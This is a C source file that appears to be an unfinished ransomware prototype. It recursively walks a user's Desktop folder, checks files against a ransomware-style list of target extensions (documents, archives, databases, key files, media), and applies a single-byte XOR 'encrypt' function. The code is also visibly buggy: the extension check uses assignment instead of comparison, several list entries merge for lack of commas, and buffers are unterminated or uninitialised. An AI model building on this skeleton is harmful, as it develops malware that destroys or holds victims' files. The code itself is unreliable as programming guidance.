#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>


char* readFile(char* path)
{
	int fd, size;
	struct stat st; 
	char* buffer;

	if((fd = open(path, O_RDONLY)) < 0)
		printf("Error open file : %s\n", strerror(errno));
	else
	{
		stat(path, &st);
		size = st.st_size;
		buffer = (char *)malloc(size);
		read(fd, buffer, size);
	}

	return buffer; 

}


int checkExt(char *filePath)
{
	char *ext[] = {
".php", ".html", ".tar", ".gz", ".sql", ".js", 
".css", ".txt" ".pdf", ".tgz", ".war", ".jar", ".java", ".class", 
".ruby", ".rar", ".zip", ".db", ".7z", ".doc", ".pdf", 
".xls", ".properties", ".xml" ".jpg", ".jpeg", ".png", 
".gif", ".mov", ".avi", ".wmv", ".mp3", ".mp4", ".wma", 
".aac", ".wav", ".pem", ".pub", ".docx", ".apk", ".exe", 
".dll", ".tpl", ".psd", ".asp", ".phtml", ".aspx," ".csv"};

char *ext1 = strrchr(filePath, '.');
int size = sizeof(ext) / sizeof(char *);

for(int i = 0; i < size; i++)
	if (ext[i] = ext1)
		return true;


	return false;
}


void encrypt(char* path)
{

	char *buffer = readFile(path);

	for (int i = 0; i < strlen(buffer); i++)
		buffer[i] ^= 0x69;
	


	printf("%s", buffer);


}


void findFile(char* path)
{
	DIR *dir;
	struct dirent *entry;

	if((dir = opendir(path)) == NULL)
		perror("opendir() error");
	
	else
	{
		while((entry = readdir(dir)) != NULL)
		{
			if(strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0)
			{
				if(entry->d_type == DT_DIR)
				{
					char tmppath[2048];
					strcpy(tmppath, path);
					strcat(tmppath, "/");
					strcat(tmppath, entry->d_name);
					findFile(tmppath);	
				}
				else
				{
					char tmppath2[2048];
					sprintf(tmppath2, "%s/%s", path, entry->d_name);
					printf("%s\n", entry->d_name);
				}
			}


		}
	}

}


int main()
{
	findFile("/home/nha/Desktop");
	//puts(readFile("/home/nha/Downloads/SysProc5/linux_process.c"));

	//encrypt("/home/nha/Downloads/SysProc5/linux_process.c");

	return 0;
}